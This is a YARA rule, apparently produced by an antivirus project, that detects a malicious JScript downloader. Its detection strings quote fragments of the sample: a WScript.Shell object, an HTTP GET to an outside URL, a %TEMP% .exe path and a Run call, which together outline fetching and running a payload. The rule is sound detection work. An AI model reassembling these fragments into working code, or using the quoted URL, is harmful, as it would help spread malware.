rule sig_20160329_b7bc44d4a424dbdc657b4a3ba142dc7d {
  meta:
    description = "datamaliciousorder - file 20160329_b7bc44d4a424dbdc657b4a3ba142dc7d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0286f6a177945eda1f98a7d7b72402b59275de8e7aa099269d9569226290c461"

  strings:
    $s1  = "function Cyjbu() {return Pftbebljsd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"a57tStcU.exe\";};" fullword ascii
    $s2  = "Rqyltdq[Hkjqtmx](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Rqrnx](Fikvh() * 11)} while (Rqyltdq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Dcjrd(Nvmdoizg, Tlptsqts){return Nvmdoizg - Tlptsqts;};" fullword ascii
    $s5  = "var Pftbebljsd = function Dsmtnlhw() {return WScript[Ncnmeos](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Dmuskw() {return ((Sxppebivpq == true) && (Sxppebivpq == Oafenx)) ? 1 : Idumyudsw;};" fullword ascii
    $s7  = "function Osyfj(Wcfvpwtre){Pftbebljsd[\"Run\"](Wcfvpwtre, Idumyudsw, Idumyudsw);};" fullword ascii
    $s8  = "return Dcjrd(Ezomb, Zjtnvmb);" fullword ascii
    $s9  = "function Dtucizyxq(){return Wskljxf;};" fullword ascii
    $s10 = "var Sxppebivpq = false;" fullword ascii
    $s11 = "var Oafenx = false;" fullword ascii
    $s12 = "var Blyejmykvc = false;" fullword ascii
    $s13 = "Oafenx = true; " fullword ascii
    $s14 = "function Awwyj(){return Ncnmeos;};" fullword ascii
    $s15 = " while (Fehhld){" fullword ascii
    $s16 = "function Spccre()" fullword ascii
    $s17 = "Sxppebivpq = true; " fullword ascii
    $s18 = "var Alhnx = new this[\"Date\"]();" fullword ascii
    $s19 = "function Fikvh(){return 22;};" fullword ascii
    $s20 = "function Iofcptfjpk(Tnhvnmsgo) {var Dnizkodzvw = (1, 2, 3, 4, 5, Tnhvnmsgo); return Dnizkodzvw;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}